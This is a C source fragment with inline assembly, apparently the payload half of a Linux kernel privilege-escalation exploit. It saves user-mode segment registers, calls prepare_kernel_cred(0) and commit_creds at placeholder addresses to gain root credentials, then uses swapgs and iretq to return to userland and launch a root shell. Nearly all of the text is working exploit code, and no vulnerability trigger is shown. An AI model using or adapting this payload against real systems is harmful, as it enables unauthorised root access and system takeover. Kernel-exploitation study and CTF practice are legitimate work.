long prepare_kernel_cred = 0xDEADC0D3;
long commit_creds = 0xDEADC0DE;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(".intel_syntax noprefix;"
            "mov _proc_cs, cs;"
            "mov _proc_ss, ss;"
            "mov _proc_rsp, rsp;"
            "pushf;" // push rflags
            "pop _proc_rflags;"
            ".att_syntax");

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}


void spawn_shell()
{
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

void privesc_ctx_swp()
{
    __asm__(".intel_syntax noprefix;"
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they'll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            "xor rdi, rdi;"
            "movabs rax, prepare_kernel_cred;"
            "call rax;" // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            "mov rdi, rax;" // RAX contains cred pointer
            "movabs rax, commit_creds;"
            "call rax;"

            // setup the context swapping
            "swapgs;" // swap GS to userland

            "mov r15, _proc_ss;"
            "push r15;"
            "mov r15, _proc_rsp;"
            "push r15;"
            "mov r15, _proc_rflags;"
            "push r15;"
            "mov r15, _proc_cs;"
            "push r15;"
            "lea r15, spawn_shell;" // lea rip, spawn_shell ; when returning to userland
            "push r15;"
            "iretq;" // swap context to userland
            ".att_syntax;");
}